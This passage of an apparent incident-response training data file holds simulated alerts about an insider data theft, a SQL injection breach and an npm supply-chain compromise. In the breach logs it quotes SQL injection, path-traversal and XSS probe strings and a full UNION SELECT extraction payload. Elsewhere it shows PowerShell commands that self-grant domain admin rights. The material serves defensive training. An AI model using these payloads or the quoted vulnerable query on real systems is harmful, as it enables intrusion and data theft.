  .env      — Environment variable files  ⚠ (may contain secrets)
  .yaml     — CI/CD pipeline configs

TIMELINE
  07:03 — Repository clones begin (GitHub Enterprise)
  07:14 — Clone operation completes (9.8 GB on local disk)
  07:22 — Upload to personal Google Drive begins
  07:31 — Upload completes

⚠  CRITICAL: .env and .pem files may include production API keys,
   database credentials, and certificate private keys.
   All production secrets should be treated as COMPROMISED.`,
      },
    ],

    PRIVILEGE_ABUSE: [
      {
        id: "it_priv_siem",
        type: "SIEM",
        title: "Privilege Escalation: Admin Rights Self-Granted",
        source: "Splunk Enterprise Security",
        severity: "CRITICAL",
        timestamp: "09:02:17 UTC",
        summary: "Engineer granted themselves domain admin rights via script 90 minutes before scheduled HR meeting.",
        content: `SPLUNK ALERT — Privilege_Escalation_Self_Service
Technique : T1548 — Abuse Elevation Control Mechanism
Severity  : CRITICAL

EVENT LOG — Active Directory Changes
  Time     : 09:02:17 UTC
  User     : j.morrison  (made the change)
  Target   : j.morrison  (received the change)
  Event    : Added to group "Domain Admins"
  DC       : SRV-DC01
  Method   : PowerShell — Add-ADGroupMember

POWERSHELL COMMAND RECOVERED
  Import-Module ActiveDirectory
  Add-ADGroupMember -Identity "Domain Admins" -Members "j.morrison"
  Add-ADGroupMember -Identity "Enterprise Admins" -Members "j.morrison"

CONTEXT
  j.morrison normal role : "Platform Engineers" group (read-only prod access)
  Requires VP + CISO approval to join Domain Admins

ACCESS ENABLED BY NEW PRIVILEGES (last 2 hours)
  09:03:41  Active Directory: exported full user/group dump
  09:08:12  SRV-BACKUP01: accessed backup archives (FY2025 financial data)
  09:14:53  SRV-DC01: GPO modified — logging reduced on ENG VLAN
  09:22:07  Email archive: accessed c-suite email folders

⚠  HR meeting was scheduled for 10:30 UTC today regarding resignation.
   This escalation occurred 88 minutes before that meeting.`,
      },
    ],

    EXFIL_ACTIVE: [
      {
        id: "it_exfil_dropbox",
        type: "DLP",
        title: "CONFIRMED: 8.2GB Uploaded to Personal Dropbox Account",
        source: "Forcepoint DLP / Netskope CASB",
        severity: "CRITICAL",
        timestamp: "16:19:44 UTC",
        summary: "Active data transfer to personal Dropbox detected and confirmed. Patient records included. Transfer complete before DLP policy triggered block.",
        content: `CASB ALERT — Personal_Cloud_Upload_Sensitive_Data
Tool      : Netskope CASB + Forcepoint DLP
Severity  : CRITICAL  |  Time: 16:19:44 UTC

DROPBOX UPLOAD — CONFIRMED
  Source   : WKSTN-ENG-17  (192.168.2.88 — j.morrison)
  Account  : j.morrison.personal@gmail.com  (PERSONAL — not corporate SSO)
  Dest URL : api.dropboxapi.com / content.dropboxapi.com
  Volume   : 8.2 GB
  Time     : 16:11:02 – 16:19:44 UTC  (8m 42s)
  Status   : COMPLETE — upload finished before policy block applied

DLP CONTENT CLASSIFICATION
  Detected classifications in upload:
  ■ HEALTHCARE/PHI          (HIPAA-protected patient data)
  ■ PII — SSN / NHS numbers
  ■ PII — Date of birth, address
  ■ FINANCIAL — Payment information
  ■ PROPRIETARY — Marked CONFIDENTIAL

PATIENT RECORD COUNT
  DLP sampling identified patient record schema in 23 of 31 sampled files
  Extrapolated total: ~340,000 patient records  (±15%)

CONCURRENT USB TRANSFER (Forcepoint DLP)
  16:14:33  USB Mass Storage Device: SanDisk Ultra 2TB (S/N: 4C530001...)
  16:14:38  robocopy.exe: C:\\Users\\j.morrison\\ → F:\\  (12.4 GB copied)
  16:19:01  USB device disconnected

CLEARTEXT HTTP TRANSFER (additional channel)
  16:22:18  HTTP POST to 185.220.101.45:80 (no TLS)
  Volume: 340 MB  |  Content: patient record CSV files (unencrypted)

TOTAL DATA EXFILTRATED (confirmed)
  Dropbox (cloud)  : 8.2 GB
  USB device       : 12.4 GB
  HTTP cleartext   : 340 MB
  TOTAL            : ~21 GB`,
      },
      {
        id: "it_exfil_darkweb",
        type: "THREAT_INTEL",
        title: "OSINT: Patient Records Appearing on Dark Web Marketplace",
        source: "DarkOwl Threat Intelligence / CISA Tip",
        severity: "CRITICAL",
        timestamp: "17:05:22 UTC",
        summary: "Sample of 1,200 patient records matching your database schema found on a dark web data marketplace. Breach is now public. HIPAA notification is mandatory.",
        content: `THREAT INTELLIGENCE ALERT — Dark Web Exposure Confirmed
Source    : DarkOwl Vision + CISA Tip Line notification
Severity  : CRITICAL  |  Detected: 17:05:22 UTC

DARK WEB LISTING FOUND
  Marketplace : AlphaBay2 (onion hidden service)
  Listing     : "[COMPANY] Healthcare — 340K patient records — $4,500"
  Posted by   : j_morrison_99  (new account, posted 47 min ago)
  Listing URL : [redacted — law enforcement notified]

SAMPLE RECORDS IN LISTING (verified against your DB schema)
  Record 1:  Sarah J***, DOB 15/03/1987, NHS: 123-456-7890, Diag: Type 2 Diabetes
  Record 2:  James M***, DOB 22/07/1972, NHS: 234-567-8901, Diag: Hypertension
  [1,198 more sample records visible in listing preview]

SELLER'S CLAIM
  "Full dataset: 340,447 records including name, DOB, NHS number,
   address, diagnosis codes, prescription history, GP records.
   Comes with 12.4GB USB copy and 8.2GB Dropbox backup."

FORENSIC LINK TO INSIDER
  Username "j_morrison_99" registered same day as j.morrison resignation
  Bitcoin wallet shows $0 balance (data not yet sold)
  Listing uses language matching j.morrison's known writing style (HR file)

LEGAL OBLIGATIONS TRIGGERED
  HIPAA Breach Rule: Notify HHS/OCR within 60 days of discovery
  Individual notification: Required for all 340,447 affected patients
  Media notification: Required if >500 patients in a jurisdiction
  Business Associate notifications: If any PHI shared with partners`,
      },
    ],

    BREACH_CONFIRMED: [
      {
        id: "it_breach_wipe",
        type: "ENDPOINT",
        title: "Evidence Destruction: WKSTN-ENG-17 Remotely Wiped",
        source: "Microsoft Intune / Windows Event Log",
        severity: "CRITICAL",
        timestamp: "17:08:14 UTC",
        summary: "The suspect remotely triggered a secure erase of his workstation — likely from home — destroying primary forensic evidence. Disk image may not be recoverable.",
        content: `ENDPOINT MANAGEMENT ALERT — Unauthorized Remote Wipe
Source    : Microsoft Intune MDM + Windows Security Log
Severity  : CRITICAL  |  Time: 17:08:14 UTC

REMOTE WIPE EVENT
  Device  : WKSTN-ENG-17  (j.morrison's workstation)
  Time    : 17:08:14 UTC
  Method  : Self-service Intune device reset (user-initiated)
  Source  : j.morrison@[COMPANY].com (Intune credentials)
  Location: IP 86.12.45.231  (residential ISP — j.morrison's home)

WIPE TYPE: "Factory Reset with BitLocker key deletion"
  - All data overwritten with zeros (DoD 5220.22-M standard)
  - BitLocker encryption keys destroyed
  - Windows reinstalled to OEM state
  - Duration: 17:08:14 – 17:31:02 UTC  (23 minutes)

WHAT WAS ON THE DEVICE (last inventory, 08:00 UTC)
  C:\\Users\\j.morrison\\Downloads\\repos\\  (9.8 GB repo clones)
  C:\\Users\\j.morrison\\Documents\\        (work files)
  Browsing history, email cache, chat logs
  db_export_2026.zip  (847 MB patient data)

RECOVERY OPTIONS
  Full disk image taken: NO  (legal hold not placed in time)
  BitLocker key: DESTROYED  (cannot decrypt even if recovered)
  Slack/Teams logs: AVAILABLE  (cloud-retained)
  Email: AVAILABLE  (Exchange server copy)
  GitHub audit log: AVAILABLE  (repository clones logged)

⚠  EVIDENCE DESTRUCTION may constitute a separate criminal offence.
   This must be documented and reported to law enforcement immediately.
   Retain all remaining digital evidence under legal hold NOW.`,
      },
    ],

    DATA_STAGING: [
      {
        id: "it_stag_usb",
        type: "ENDPOINT",
        title: "USB Mass Storage Device Connected — WKSTN-ENG-17",
        source: "CrowdStrike Falcon / Windows Event Log",
        severity: "HIGH",
        timestamp: "09:44:31 UTC",
        summary: "A 2TB USB drive was connected this morning. File copy operations consistent with bulk data staging.",
        content: `ENDPOINT ALERT — USB Device Connected
Host     : WKSTN-ENG-17  (192.168.2.88)
User     : [COMPANY]\\j.morrison
Time     : 09:44:31 UTC

DEVICE DETAILS
  Type        : USB Mass Storage (SanDisk Ultra 2TB)
  Serial      : 4C530001231111...
  Drive letter: F:\\
  Connected   : 09:44:31 UTC
  Disconnected: 10:09:12 UTC  (24m 41s)

FILE OPERATIONS DURING CONNECTION
  09:44:48  robocopy.exe started (scripted copy operation)
  09:44:52  Copying: C:\\Users\\j.morrison\\Downloads\\repos\\ → F:\\backup\\
  09:44:52  Copying: C:\\temp\\db_export_2026.zip (847 MB)
  09:44:53  Copying: C:\\Users\\j.morrison\\Documents\\

VOLUME COPIED
  Total files : 14,847
  Total size  : 11.3 GB
  Duration    : 24 minutes 41 seconds

FILES OF CONCERN
  F:\\backup\\secrets-vault-config\\  (infrastructure secrets)
  F:\\backup\\deployment-keys\\       (production SSH keys)
  F:\\db_export_2026.zip            (customer data export)

⚠  Device removed at 10:09 and not seen again.
   Chain of custody: device was physically removed from premises.`,
      },
    ],

  },

  // ── DATA BREACH ───────────────────────────────────────────────────────────

  "data-breach": {

    NORMAL: [
      {
        id: "db_normal_waf",
        type: "NETWORK",
        title: "WAF: Elevated Probe Rate — /api/search Endpoint",
        source: "Cloudflare WAF / SIEM",
        severity: "LOW",
        timestamp: "02:14:07 UTC",
        summary: "Automated scanning of the public search API from a single IP. Pattern consistent with vulnerability reconnaissance.",
        content: `WEB APPLICATION FIREWALL — PROBE DETECTION
Rule      : Rate_Limit_API_Exceeded
Source IP : 45.142.120.83  (AS209605, Netherlands — VPN detected)
Target    : /api/v2/search
Generated : 02:14:07 UTC

REQUEST PATTERN
  02:11:33  GET /api/v2/search?q=test&limit=1
  02:11:34  GET /api/v2/search?q=' OR 1=1--&limit=1     ← SQLi probe
  02:11:34  GET /api/v2/search?q=" OR "1"="1&limit=1    ← SQLi probe
  02:11:35  GET /api/v2/search?q=1; DROP TABLE users--  ← SQLi probe
  02:11:35  GET /api/v2/search?q=../../../etc/passwd     ← Path traversal
  02:11:36  GET /api/v2/search?q=<script>alert(1)</script>  ← XSS probe
  [247 more probe requests in 4 minutes]

IP REPUTATION
  45.142.120.83: ProtonVPN exit node  |  Abuse score: 42/100
  Prior activity: Port scanning against .co.uk IP ranges (2026-05-31)

WAF RESPONSE
  Action: CHALLENGE (JavaScript challenge issued)
  Passed: YES — requester solved JS challenge
  Status: ⚠ IP allowed through — probing continued

OVERNIGHT CONTEXT
  Total requests from IP: 1,847 (02:11 – 05:48 UTC)
  Requests blocked by WAF: 1,603
  Requests that reached backend: 244  ← some may have succeeded`,
      },
    ],

    INITIAL_DETECTION: [
      {
        id: "db_det_sqli",
        type: "NETWORK",
        title: "WAF: SQL Injection CONFIRMED — Data Extracted",
        source: "Cloudflare WAF + Database Activity Monitor",
        severity: "CRITICAL",
        timestamp: "06:03:44 UTC",
        summary: "WAF logs show successful SQL injection. Database monitor confirms 450,000 customer records extracted.",
        content: `CONFIRMED SQL INJECTION — DATA BREACH IN PROGRESS
Alert     : DB_Exfiltration_Volume_Exceeded
Time      : 06:03:44 UTC  |  Severity: CRITICAL

SUCCESSFUL INJECTION PAYLOAD (from WAF log, 05:57:12 UTC)
GET /api/v2/search?q=1 UNION SELECT username,password_hash,email,
    credit_card_last4,created_at FROM users--&limit=500

HTTP RESPONSE: 200 OK  |  Response size: 2.1 MB (vs normal avg: 4 KB)

DATABASE ACTIVITY MONITOR — PROD-DB-01
  05:57:12  UNION SELECT executed — returned 500 user rows
  05:57:14  UNION SELECT executed — returned 500 user rows (offset 500)
  05:57:16  UNION SELECT executed — returned 500 user rows (offset 1000)
  [897 identical queries, incrementing offset]
  06:03:44  UNION SELECT executed — returned 312 rows  (FINAL — end of table)

EXTRACTED DATA SUMMARY
  Table: users
  Rows extracted : 449,812
  Fields         : id, username, email, password_hash (bcrypt),
                   credit_card_last4, address, created_at

  Table: api_keys
  Rows extracted : 2,341
  Fields         : user_id, api_key (plaintext!), permissions, last_used

ATTACKER IP: 45.142.120.83  (same IP from overnight probe)
Duration   : 6m 32s  |  Data volume: ~900 MB exfiltrated

⚠  449,812 users affected. API keys in plaintext — ALL API KEYS REVOKED IMMEDIATELY.`,
      },
      {
        id: "db_det_db",
        type: "FILE",
        title: "Database Query History: Injection Entry Point Identified",
        source: "PostgreSQL pg_stat_statements + slow query log",
        severity: "HIGH",
        timestamp: "06:08:11 UTC",
        summary: "Database logs confirm unparameterized query in the search endpoint. Exact vulnerable code location identified.",
        content: `POSTGRESQL FORENSIC LOG EXTRACT
Database  : prod_db  |  Server: PROD-DB-01  (10.0.1.15)
Extracted : 06:08:11 UTC by on-call DBA

SLOW QUERY LOG — ANOMALOUS QUERIES (05:57 – 06:04 UTC)
  duration: 1847ms  statement: SELECT * FROM products WHERE name = '1
    UNION SELECT username,password_hash,email,credit_card_last4,
    created_at FROM users-- '

  duration: 1923ms  statement: [same pattern, 897 times]

QUERY ORIGIN — Application Code
  Endpoint  : GET /api/v2/search
  Code file : src/api/routes/search.js  LINE 47

  VULNERABLE CODE:
    const query = "SELECT * FROM products WHERE name = '" + req.query.q + "'";
    const result = await db.query(query);  // ← DIRECT STRING INTERPOLATION

  SAFE VERSION SHOULD BE:
    const query = 'SELECT * FROM products WHERE name = $1';
    const result = await db.query(query, [req.query.q]);

PATCH AVAILABLE: Yes (parameterized query — 3 line change)
Estimated fix time: 15 minutes (requires deployment to production)

NOTE: Patching prod will take the endpoint offline for ~2 minutes.
Must weigh evidence preservation vs continued exposure.`,
      },
    ],

    FORENSICS: [
      {
        id: "db_for_scope",
        type: "FILE",
        title: "External Forensics Report: Full Breach Scope Confirmed",
        source: "Mandiant Incident Response — Preliminary Report",
        severity: "HIGH",
        timestamp: "11:44:03 UTC",
        summary: "Forensic firm has confirmed the full scope: 449,812 records exfiltrated, attack origin 6 hours before detection, no other entry points found.",
        content: `MANDIANT INCIDENT RESPONSE — PRELIMINARY FINDINGS
Client    : [COMPANY]  |  Case: IR-2026-0847
Prepared  : 11:44:03 UTC  |  Status: PRELIMINARY — subject to change

BREACH SCOPE (CONFIRMED)
  Attack vector   : SQL injection via /api/v2/search endpoint
  First intrusion : 02:11 UTC (reconnaissance)
  Data extraction : 05:57 – 06:04 UTC  (7 minutes)
  Detection       : 06:03 UTC  (during extraction — 3 min alert delay)
  Containment     : 06:54 UTC  (after patch applied)

DATA CONFIRMED EXFILTRATED
  449,812 unique user records:
    - Full name, email, postal address
    - Bcrypt-hashed passwords (10 rounds)
    - Credit card last 4 digits
    - Account creation date

  2,341 API keys (PLAINTEXT)
    - All revoked as of 07:12 UTC
    - Activity logs show 43 API keys used by attacker after theft

  NO other data tables accessed (confirmed by query log analysis)
  NO evidence of additional entry points or persistent access

ATTACKER ATTRIBUTION
  IP 45.142.120.83: ProtonVPN exit node (cannot attribute)
  Automation tool: SQLMap v1.7.9 (identified by user-agent + timing)
  Technique: UNION-based extraction (not blind — faster, noisier)

PATCHING STATUS
  Vulnerability: Unparameterized query (fixed 06:54 UTC)
  WAF rule added: Block UNION SELECT patterns (06:58 UTC)
  Penetration test recommended to identify similar issues`,
      },
      {
        id: "db_for_apikeys",
        type: "SIEM",
        title: "API Key Abuse: 43 Stolen Keys Used by Attacker",
        source: "Splunk / API Gateway Logs",
        severity: "HIGH",
        timestamp: "12:03:18 UTC",
        summary: "Stolen API keys were actively used by the attacker between 06:09 and 07:12 UTC. API calls made to customer data endpoints.",
        content: `SPLUNK ANALYSIS — Stolen API Key Usage
Query     : index=api_gateway user_id IN [stolen_key_users] earliest=06:00
Generated : 12:03:18 UTC

STOLEN API KEY ACTIVITY (06:09 – 07:12 UTC)
  43 of 2,341 stolen keys actively used by attacker IP (45.142.120.83)

  TOP 5 MOST-USED STOLEN KEYS:
  Key #1 (user_id: 4821):  2,841 API calls  — GET /api/user/profile
  Key #2 (user_id: 12943): 1,203 API calls  — GET /api/orders/history
  Key #3 (user_id: 7234):  987 API calls    — GET /api/payments/list
  Key #4 (user_id: 29401): 734 API calls    — POST /api/account/settings
  Key #5 (user_id: 8821):  512 API calls    — GET /api/documents/download

ENDPOINTS ACCESSED VIA STOLEN KEYS
  GET /api/user/profile       — 89,441 calls  (user profile data)
  GET /api/orders/history     — 34,221 calls  (purchase history)
  GET /api/documents/download — 8,341 calls   (PDF documents downloaded)
  POST /api/account/settings  — 2,134 calls   (unknown intent)

DATA VOLUME VIA API (additional to SQL exfil)
  Estimated additional records accessed: ~120,000 user profiles
  Documents downloaded: 8,341 PDFs (mix of invoices and statements)

ALL KEYS REVOKED: 07:12 UTC  (65 minutes of active abuse)
AFFECTED USERS NOTIFIED: PENDING

⚠  Users whose API keys were actively used face higher risk of account
   takeover — attacker had access to their full profile data.
   Consider mandatory password reset for these 43,000 users.`,
      },
    ],

    REGULATORY_NOTIFICATION: [
      {
        id: "db_reg_gdpr",
        type: "FILE",
        title: "GDPR Article 33 — ICO Notification Draft Ready",
        source: "Legal / DPO Office",
        severity: "HIGH",
        timestamp: "15:22:11 UTC",
        summary: "ICO notification drafted. GDPR 72-hour clock runs from 06:03 UTC today. You have until 06:03 UTC in 3 days. Filing now protects against additional fines.",
        content: `GDPR BREACH NOTIFICATION — DRAFT READY FOR REVIEW
Prepared by: Data Protection Officer + External Counsel
Status     : DRAFT — Requires CISO and CEO signature
Deadline   : 06:03 UTC [DATE+3] (72 hours from awareness)
Time remaining: 38 hours 41 minutes

NOTIFICATION TO: ICO (Information Commissioner's Office)
Form: Mandatory breach notification under GDPR Article 33

─── DRAFT CONTENT ───────────────────────────────────────

1. NATURE OF THE BREACH
   SQL injection attack on public API endpoint resulted in
   unauthorised extraction of personal data.

2. CATEGORIES AND APPROXIMATE NUMBER OF INDIVIDUALS CONCERNED
   449,812 data subjects (UK: 287,441 | EU: 89,214 | Other: 73,157)
   Data categories: Name, email, address, hashed password,
   payment card last 4 digits, account history.

3. LIKELY CONSEQUENCES
   Risk of phishing/credential stuffing attacks.
   Low risk of financial fraud (no full card numbers).
   Medium risk of targeted social engineering.

4. MEASURES TAKEN
   - Vulnerability patched 06:54 UTC
   - All API keys revoked 07:12 UTC
   - Forensics engaged (Mandiant)
   - Passwords reset notification pending

─── FILING NOTES ────────────────────────────────────────
Filing early (while investigating) is permitted and recommended.
"Not all information may be available" — can supplement later.

Failure to notify within 72 hours: up to €10M or 2% global turnover.
Inadequate security measures: up to €20M or 4% global turnover.

DO NOT DELAY — file the draft now and supplement with forensic report.`,
      },
    ],

    CUSTOMER_NOTIFICATION: [
      {
        id: "db_cust_email",
        type: "EMAIL",
        title: "Customer Breach Notification Email — Draft",
        source: "Legal / Communications Team",
        severity: "MEDIUM",
        timestamp: "18:44:07 UTC",
        summary: "Draft breach notification email ready for 449,812 affected customers. Legal has approved. Requires final sign-off before send.",
        content: `BREACH NOTIFICATION EMAIL — APPROVED DRAFT
Recipients : 449,812 customers  |  Scheduled: Pending approval
Approved by: Legal, DPO  |  Awaiting: CEO sign-off

SUBJECT: Important security notice regarding your [COMPANY] account

─── EMAIL BODY ──────────────────────────────────────────

Dear [Customer Name],

We are writing to inform you of a security incident that affected
your [COMPANY] account.

WHAT HAPPENED
On [DATE], we discovered that an attacker exploited a technical
vulnerability in our website and gained unauthorised access to
customer account data.

WHAT INFORMATION WAS INVOLVED
Your account data was among those accessed, including:
• Name and email address
• Postal address
• Encrypted password (bcrypt-hashed — not plaintext)
• Last 4 digits of payment card (not full card number)

WHAT WE ARE DOING
• Vulnerability has been fixed
• All API access tokens have been reset
• We have engaged a leading cybersecurity firm
• We have notified the Information Commissioner's Office (ICO)

WHAT YOU SHOULD DO
1. Change your [COMPANY] password immediately
2. If you use the same password elsewhere, change those too
3. Be alert to phishing emails claiming to be from us
4. We will never ask for your full password by email

Click here to reset your password: [SECURE LINK]

We are deeply sorry for this incident.
[CEO Name], CEO, [COMPANY]

─── SEND METRICS ─────────────────────────────────────────
UK customers (287,441)   — legally required under UK GDPR
EU customers (89,214)    — legally required under EU GDPR
Other (73,157)           — recommended but not legally mandated`,
      },
    ],

    CONTAINMENT: [
      {
        id: "db_cont_forensics",
        type: "FILE",
        title: "Forensic Timeline: Attack Reconstructed",
        source: "Nginx access logs + WAF logs (combined)",
        severity: "HIGH",
        timestamp: "07:44:18 UTC",
        summary: "Full attack timeline reconstructed. Attacker operated for 3h 52m before detection. Customer notification scope confirmed.",
        content: `FORENSIC TIMELINE — [COMPANY] Data Breach
Prepared by: Security Operations  |  07:44:18 UTC
Status     : DRAFT — DO NOT DISTRIBUTE

TIMELINE OF EVENTS
  02:11 UTC  Reconnaissance begins from 45.142.120.83 (VPN)
  02:11-05:56  WAF blocks 1,603 probe requests; 244 reach backend
  05:57 UTC  First successful SQL injection payload executed
  05:57-06:04  Automated extraction: 449,812 customer records + 2,341 API keys
  06:04 UTC  Extraction complete — attacker connection terminated
  06:03 UTC  Database monitor alert fires (3 minute delay in alert pipeline)
  06:47 UTC  On-call engineer paged (44 minute acknowledgment delay)
  06:54 UTC  This incident created

DWELL TIME (undetected): 3h 52m

AFFECTED DATA
  449,812 customer records including:
  - Names, email addresses
  - Bcrypt password hashes (10-round — may be crackable for weak passwords)
  - Credit card LAST 4 DIGITS ONLY (no full PANs — not PCI scope)
  - Postal addresses

  2,341 API keys (PLAINTEXT — TREAT AS FULLY COMPROMISED)
  - All API keys must be revoked and reissued

GEOGRAPHIC DISTRIBUTION OF AFFECTED USERS
  United Kingdom: 287,441 (64%)  ← GDPR applies → ICO notification required
  European Union:  89,214 (20%)  ← GDPR applies → may require EU DPA notification
  United States:   51,903 (11%)  ← State breach notification laws apply
  Other:           21,254  (5%)

⚠  GDPR Article 33: 72-hour supervisory authority notification clock
   running from 06:03 UTC. Deadline: 06:03 UTC on [DATE+3].
   Time elapsed: 1h 41m  |  Remaining: 70h 19m`,
      },
    ],

  },

  // ── SUPPLY CHAIN ATTACK ───────────────────────────────────────────────────

  "supply-chain-attack": {

    NORMAL: [
      {
        id: "sc_normal_advisory",
        type: "THREAT_INTEL",
        title: "npm Security Advisory: event-stream-utils@3.2.1 Compromised",
        source: "GitHub Advisory Database / npm Security",
        severity: "MEDIUM",
        timestamp: "11:22:04 UTC",
        summary: "Popular npm package compromised with credential-stealing payload. 4.2 million weekly downloads. Check if in use.",
        content: `NPM SECURITY ADVISORY — GHSA-2026-xxxx-xxxx
Package  : event-stream-utils
Version  : 3.2.1  (MALICIOUS)  |  Safe: ≤3.2.0 or ≥3.2.2
Downloads: 4.2M/week  |  Dependents: 8,900 packages
Severity : CRITICAL  |  Published: 90 minutes ago

DESCRIPTION
A malicious contributor submitted a PR to event-stream-utils that
was approved and merged 9 weeks ago. Version 3.2.1 includes obfuscated
code that:

  1. Reads environment variables (process.env) at startup
  2. Searches for common secret patterns:
     AWS_ACCESS_KEY, STRIPE_SECRET_KEY, DATABASE_URL,
     API_KEY, SECRET, PASSWORD, TOKEN, PRIVATE_KEY
  3. Encrypts and exfiltrates found secrets to:
     api.telemetry-analytics[.]io (malicious)

MALICIOUS CODE LOCATION
  node_modules/event-stream-utils/lib/internal/telemetry.js
  Lines 847-891 (obfuscated with eval + base64)

CHECK IF YOU ARE AFFECTED
  $ npm ls event-stream-utils
  $ cat package-lock.json | grep "event-stream-utils"
  $ grep -r "event-stream-utils" node_modules/.package-lock.json

DETECTION: Check for outbound connections to api.telemetry-analytics[.]io
in your firewall/proxy logs over the last 63 days.`,
      },
    ],

    SCOPE_ANALYSIS: [
      {
        id: "sc_scope_servers",
        type: "SIEM",
        title: "Splunk: Malicious Code Executed on 5 Production Servers",
        source: "Splunk Enterprise Security / CrowdStrike",
        severity: "CRITICAL",
        timestamp: "12:18:44 UTC",
        summary: "Confirmed execution of the malicious payload on all servers running the affected package version. Secrets exfiltrated from all 5 hosts.",
        content: `SCOPE ANALYSIS — event-stream-utils@3.2.1 Execution
Query     : index=endpoint process=node.js module=event-stream-utils
Timeframe : 63 days (period of exposure)

AFFECTED PRODUCTION SERVERS
  api-server-01  (PRIMARY)   — CONFIRMED execution, secrets exfiltrated
  api-server-02  (PRIMARY)   — CONFIRMED execution, secrets exfiltrated
  api-server-03  (PRIMARY)   — CONFIRMED execution, secrets exfiltrated
  api-worker-01  (WORKERS)   — CONFIRMED execution, secrets exfiltrated
  api-worker-02  (WORKERS)   — CONFIRMED execution, secrets exfiltrated

SECRETS CONFIRMED EXFILTRATED (from each host's process.env)
  ■ AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY  (all 5 hosts)
  ■ DATABASE_URL  (PostgreSQL with credentials embedded)  (all 5 hosts)
  ■ STRIPE_SECRET_KEY  (api-server-01/02/03)
  ■ SENDGRID_API_KEY   (api-server-01)
  ■ REDIS_URL          (api-worker-01/02)
  ■ JWT_SECRET         (all 5 hosts)

TRANSMISSION CONFIRMED
  1,512 POST requests to api.telemetry-analytics.io over 63 days
  All secrets sent in encrypted JSON payload
  Attacker had 63 days to exploit these credentials

CUSTOMER DATA AT RISK
  AWS keys: Had S3 access to customer-data bucket (read/write)
  DB credentials: Direct PostgreSQL access to production database
  Stripe key: Can read all customer payment data and charge cards
  JWT secret: Can forge auth tokens for ANY customer account

DEVELOPMENT SERVERS: NOT affected (used yarn.lock pinned version)
STAGING: NOT affected (different package-lock.json)`,
      },
      {
        id: "sc_scope_customers",
        type: "FILE",
        title: "Impact Assessment: Customer Data Potentially Accessed for 63 Days",
        source: "Security Engineering / AWS CloudTrail",
        severity: "CRITICAL",
        timestamp: "12:41:17 UTC",
        summary: "AWS CloudTrail shows the stolen keys were used to access customer data S3 bucket 23 times over 63 days. Full audit in progress.",
        content: `AWS CLOUDTRAIL ANALYSIS — Stolen Key Usage
Timeframe : 63 days (since event-stream-utils@3.2.1 deployment)
Source    : AWS CloudTrail + GuardDuty

STOLEN AWS KEY ACTIVITY
  Key     : AKIA[REDACTED]JX7Q  (stolen from api-server-01 env)
  Source  : 185.220.101.47  (Tor exit node / bulletproof)

  API CALLS USING STOLEN KEY:
  [Day 1]   s3:GetObject  — /customer-exports/test_sample.csv  (2.3 MB)
  [Day 7]   s3:ListBucket  — customer-data bucket (enumeration)
  [Day 14]  s3:GetObject  — /customer-exports/full_export_may.csv  (1.8 GB)
  [Day 21]  rds:DescribeDBInstances  (mapping DB endpoints)
  [Day 35]  s3:GetObject  — /analytics/email_list_q1.csv  (340 MB)
  [Day 42]  rds:CreateSnapshot  — prod database (copy taken)
  [Day 49]  s3:GetObject  — /customer-exports/full_export_june.csv  (2.1 GB)
  [Day 56]  rds:RestoreDBInstanceFromSnapshot  (restored in attacker's AWS)
  [Day 63]  TODAY — Keys rotated (by your team)

CUSTOMER DATA ACCESSED (confirmed)
  2x full customer export CSVs (May + June)
  1x email marketing list
  1x full database snapshot (restored in attacker's environment)

ESTIMATED RECORDS AT RISK: 2.1M+ customers
STRIPE API KEY USAGE: 0 unauthorized charges detected (yet)
JWT SECRET USAGE: Cannot be detected (stateless — no audit trail)`,
      },
    ],

    VENDOR_NOTIFICATION: [
      {
        id: "sc_vendor_npm",
        type: "FILE",
        title: "npm Security Team Response — Joint Disclosure Required",
        source: "npm / GitHub Security Advisory",
        severity: "HIGH",
        timestamp: "14:02:33 UTC",
        summary: "npm security team has been notified and confirmed the malicious package. They want coordinated disclosure before you go public to prevent the attacker from fleeing.",
        content: `NPM SECURITY RESPONSE — COORDINATED DISCLOSURE
From      : security@npmjs.com
To        : security@[COMPANY].com
Time      : 14:02:33 UTC

Dear [COMPANY] Security Team,

Thank you for reporting the compromise of event-stream-utils@3.2.1.
We have confirmed the malicious code and are coordinating the response.

CURRENT STATUS
  ■ Version 3.2.1 has been UNPUBLISHED from the registry (11:58 UTC)
  ■ Version 3.2.2 (clean) published as replacement
  ■ 4,218 packages depend on the affected version
  ■ We have identified 847 organisations downloaded it

COORDINATED DISCLOSURE TIMELINE (proposed)
  Today 17:00 UTC  — npm publishes security advisory
  Today 17:00 UTC  — GitHub advisory database updated
  Today 17:00 UTC  — Your organisation can publish full details
  Tomorrow 09:00   — Media embargo lifted

REQUEST
  Please do NOT publish details before 17:00 UTC today.
  Early disclosure could alert the threat actor to destroy
  evidence before law enforcement can act.
  FBI Cyber Division has been notified (case #: 2026-FBI-XXXXX)

WHAT WE NEED FROM YOU
  1. Confirm the malicious code hash you found
  2. Share the C2 domain (api.telemetry-analytics.io) — we have others
  3. Confirm whether law enforcement has been engaged

We will credit your security team in the advisory if desired.

Isaac Chen
npm Security Team  |  GitHub, Inc.`,
      },
    ],

    PATCH_DEPLOYMENT: [
      {
        id: "sc_patch_status",
        type: "ENDPOINT",
        title: "Patch Deployment Status — All Production Servers Updated",
        source: "GitHub Actions CI/CD / Kubernetes",
        severity: "MEDIUM",
        timestamp: "16:44:18 UTC",
        summary: "Safe version 3.2.2 deployed to all servers. All stolen credentials rotated. System returning to normal. Verification scan in progress.",
        content: `DEPLOYMENT STATUS — Remediation Complete
Pipeline  : GitHub Actions — security-patch-deploy
Time      : 16:44:18 UTC

PACKAGE UPDATE STATUS
  event-stream-utils  3.2.1 → 3.2.2 (clean)
  Deployment method: Rolling update (zero downtime)

  api-server-01  : ✓ Updated  16:38:42 UTC  |  Health: OK
  api-server-02  : ✓ Updated  16:40:11 UTC  |  Health: OK
  api-server-03  : ✓ Updated  16:41:39 UTC  |  Health: OK
  api-worker-01  : ✓ Updated  16:43:02 UTC  |  Health: OK
  api-worker-02  : ✓ Updated  16:44:18 UTC  |  Health: OK

CREDENTIAL ROTATION STATUS
  ✓ AWS Access Keys     — rotated 13:42 UTC  (old keys invalidated)
  ✓ DATABASE_URL        — new password set 13:51 UTC
  ✓ STRIPE_SECRET_KEY   — rotated via Stripe dashboard 14:03 UTC
  ✓ SENDGRID_API_KEY    — rotated 14:07 UTC
  ✓ JWT_SECRET          — rotated 14:12 UTC  (all sessions invalidated)
  ✓ REDIS_URL           — new credentials 14:19 UTC

POST-ROTATION VERIFICATION
  Stripe: No unauthorized charges in 63-day period  ✓
  AWS: Attacker key activity ceased after rotation  ✓
  Database: No unauthorized connections since rotation  ✓

